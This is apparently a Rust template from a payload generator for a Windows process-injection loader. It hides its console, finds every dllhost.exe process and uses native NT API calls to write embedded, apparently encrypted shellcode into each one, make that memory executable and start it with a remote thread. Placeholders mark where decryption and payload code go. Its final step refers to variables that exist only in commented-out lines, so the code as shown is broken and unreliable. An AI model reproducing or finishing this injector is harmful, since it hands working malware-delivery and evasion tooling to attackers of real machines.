#![windows_subsystem = "windows"]

use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
use std::include_bytes;

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, GENERIC_ALL},
        lmaccess::{ACCESS_ALL}
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
    }
};
use winapi::ctypes::c_void;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use std::{ptr::null_mut};
use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntpsapi::NtOpenProcess;
use ntapi::ntmmapi::NtAllocateVirtualMemory;
use ntapi::ntmmapi::NtWriteVirtualMemory;
use ntapi::ntmmapi::NtProtectVirtualMemory;

{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn boxboxbox(tar: &str) -> Vec<u32> {
    // search for processes to inject into
    let mut dom: Vec<u32> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        //println!("{} {}", pro.pid(), pro.name());
        dom.push(pro.pid().as_u32());
    }
    return dom;
}

fn enhance(buf: &Vec<u8>, tar: &u32) {
    // injecting in target processes :)
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };

    unsafe {

        //let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, *tar).unwrap();
        let open_status = NtOpenProcess(&mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
        if !NT_SUCCESS(open_status) {
            panic!("Error opening process: {}", open_status);
        }
        //let result_ptr = VirtualAllocEx(h_process, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
        let mut allocstart : *mut c_void = null_mut();
        let mut size : usize = buf.len();
        let alloc_status = NtAllocateVirtualMemory(process_handle, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(alloc_status) {
            panic!("Error allocating memory to the target process: {}", alloc_status);
        }
        let mut byteswritten = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let buffer_length = buf.len();
        let write_status = NtWriteVirtualMemory(process_handle, allocstart, buffer, buffer_length, &mut byteswritten);
        if !NT_SUCCESS(write_status) {
            panic!("Error writing to the target process: {}", write_status);
        }
        /*let _resb = WriteProcessMemory(
            h_process,
            result_ptr,
            buf.as_ptr() as _,
            buf.len(),
            Some(&mut byteswritten),
        );
        */
        let mut old_perms = PAGE_EXECUTE_READWRITE;
        let protect_status = NtProtectVirtualMemory(process_handle, allocstart, buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);

        /* 
        let _bool = VirtualProtectEx(
            h_process,
            result_ptr,
            buf.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_perms,
        );
        */
        let _res_crt = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(std::mem::transmute(result_ptr)),
            None,
            0,
            None,
        )
        .unwrap();
    }
}

fn main() {
    // inject in the following processes:
    let tar: &str = "dllhost.exe";

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let list: Vec<u32> = boxboxbox(tar);
    if list.len() == 0 {
        panic!("[-] Unable to find a process.")
    } else {
        for i in &list {
            {{MAIN}}
            enhance(&vec, i);
        }
    }
}
